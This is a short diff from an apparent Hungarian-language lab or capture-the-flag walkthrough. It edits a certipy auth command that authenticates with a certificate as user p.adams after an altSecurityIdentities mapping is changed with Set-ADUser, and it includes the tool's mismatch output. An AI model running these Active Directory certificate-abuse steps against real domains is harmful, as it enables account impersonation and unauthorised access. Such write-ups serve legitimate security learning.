@@ -375,7 +375,7 @@ Set-ADUser p.adams -Replace @{altSecurityIdentities=$map}
 ## Certipy auth p.adams-ként
 
 ```bash
-certipy auth -pfx nonamepc.pfx -dc-ip 10.10.11.65 -username p.adams
+certipy auth -pfx nosecpc.pfx -dc-ip 10.10.11.65 -username p.adams
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [!] The provided username does not match the identification found in the provided certificate: 'P.ADAMS' - 'meow$'
